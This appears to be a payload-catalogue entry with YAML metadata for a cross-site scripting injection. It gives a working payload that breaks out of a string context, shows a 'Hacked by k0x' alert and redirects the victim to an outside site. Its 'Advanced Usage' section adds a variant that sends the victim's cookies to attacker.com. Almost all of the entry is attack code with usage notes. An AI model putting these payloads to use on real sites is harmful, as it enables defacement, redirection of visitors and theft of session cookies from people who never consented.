---
id: c1d2e3f4-h5i6-7890-defg-456789012345
data: >-
  video");alert('Hacked by
  k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
tags:
  - xss
  - injection
type: command
output: Browser alert 'Hacked by k0x' and redirect after 5000ms
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:49.589Z'
verified: false
validated: true
submitted: true
---
# xss-payload-injection

## Command

```javascript
video");alert('Hacked by k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
```

## Description

This JavaScript payload is injected into a vulnerable web parameter to close a string context and execute malicious code, demonstrating XSS by alerting a message and redirecting the page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| alert('Hacked by k0x') | Displays compromise message in browser | Yes |
| setTimeout(()=>location.href='https://k0x.xyz',5000) | Redirects to attacker site after 5 seconds | Yes |
| video"); ... // | String closure and comment to evade detection | Yes |

## Examples

### Basic Usage

```javascript
video");alert('Hacked by k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
```

### Advanced Usage

Adapt for different contexts, e.g., add data exfil: video");alert('Hacked');fetch('https://attacker.com/steal?cookie='+document.cookie);//

## Expected Output

An alert box appears with 'Hacked by k0x', followed by a 5-second delay and redirect to https://k0x.xyz. In a full exploit, this confirms code execution in the victim's browser.

## Related

- [[Related Procedure: Create-Malicious-JavaScript-Payload-for-XSS]]
